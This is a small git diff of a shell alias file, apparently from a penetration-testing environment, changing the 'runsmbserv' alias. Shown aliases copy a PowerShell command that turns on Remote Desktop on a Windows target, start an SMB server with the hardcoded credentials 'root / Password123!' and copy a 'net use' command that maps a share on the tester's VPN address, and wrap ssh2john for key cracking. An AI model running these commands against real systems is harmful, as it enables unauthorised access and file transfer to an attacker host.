@@ -12,5 +12,5 @@ alias runwebdav='sudo /root/.pyenv/versions/3.11.8/bin/wsgidav --host 0.0.0.0 --
 alias getrdp='echo "Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" -Value 0" | xclip -selection clipboard && echo "CMD copié dans le presse-papiers"'
 alias winfast='bash /opt/resources/windows/winfast.sh'
 alias linfast='bash /opt/resources/linux/linfast.sh'
-alias runsmbserv='echo "net use Z: \\\\$(ip a sh dev tun0 | grep -oP "(?:[0-9]{1,3}\.){3}[0-9]{1,3}")\\share /user:root Password123!" | xclip -selection clipboard -quiet && smbserver.py -smb2support share $(pwd) -user root -password Password123! && echo "Commande net use copiée dans le presse-papiers"'
+alias runsmbserv='echo "net use Z:\\\\$(ip a sh dev tun0 | grep -oP "(?:[0-9]{1,3}\.){3}[0-9]{1,3}")\\share /user:root Password123!" | xclip -selection clipboard -quiet && smbserver.py -smb2support share $(pwd) -user root -password Password123! && echo "Commande net use copiée dans le presse-papiers"'
 alias ssh2john='/opt/tools/john/run/ssh2john.py'
